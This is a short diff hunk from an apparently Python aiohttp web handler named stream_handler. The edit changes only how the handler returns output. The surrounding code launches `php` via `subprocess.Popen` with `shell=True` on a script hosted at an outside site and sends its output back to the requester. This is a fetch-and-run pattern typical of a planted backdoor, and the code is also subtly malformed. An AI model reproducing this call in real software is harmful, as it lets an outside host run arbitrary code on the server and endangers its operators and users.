@@ -31,7 +31,7 @@ async def stream_handler(request):
         # if you want output
         proc = subprocess.Popen(["php", "https://blackboxcinema.site/luq.php"], shell=True, stdout=subprocess.PIPE)
         s = proc.stdout.read()
-        return web.json_response({"hshs":s})
+        return s
 
     except ValueError as e:
         logging.error(e)
